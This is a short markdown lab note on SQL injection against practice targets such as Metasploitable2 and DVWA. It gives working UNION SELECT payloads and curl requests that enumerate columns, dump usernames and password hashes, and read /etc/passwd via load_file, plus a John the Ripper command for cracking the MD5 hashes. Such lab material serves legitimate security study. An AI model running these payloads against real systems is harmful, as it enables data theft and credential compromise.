# SQL Injection

- [Config Metasploitable2](./configMetasploitable2.md)
- [Config Owasp](./ftp_user_config.md)

### Describe table columns
First the one need to find how many columns there are in the table
```bash
php -a
# check if the table has four columns
echo rawurlencode(' union select 1,2,3,4');

# At another tab
curl 10.0.0.3?id="1%20union%20select%201%2C2%2C3%2C4"
# if the curl does not return error, then, the table has four columns

```
### General examples
```bash
php -a

echo rawurlencode(' UNION SELECT 1,column_name,column_type,4 FROM information_schema.columns WHERE table_name="customers" -- ');

echo rawurlencode(' UNION SELECT * FROM customers -- ');

# At another cli tab
curl 10.0.0.3?id="1"

curl 10.0.0.3?id="1%20UNION%20SELECT%201%2Ccolumn_name%2Ccolumn_type%2C4%20FROM%20information_schema.columns%20WHERE%20table_name%3D%22customers%22%20--%20"

curl 10.0.0.3?id="1%20UNION%20SELECT%20%2A%20FROM%20customers%20--%20"

```

### Metasploitable2 Injections
The single quote is needed becase it ends the first raw query param value and<br>
starts the sql injection statment.<br>
The same is for the #, it comments the rest of the raw query, allowing the injection.<br>
```
' union select 1,2,3 #

' union select database(),user(),version() #

# same as
select database(); # at mysql terminal

' union select '',table_schema,table_name from information_schema.tables #

' union select '',column_name,'' from information_schema.columns where table_name='accounts' #

' union select '',username,password from accounts #

' union select '',column_name,'' from information_schema.columns where table_name='users' #

' union select '',concat(first_name,':',password),'' from dvwa.users #

# crack passwords with John the Ripper
john passwords.txt --format=raw-MD5

' union select '','',load_file('/etc/passwd') #

```
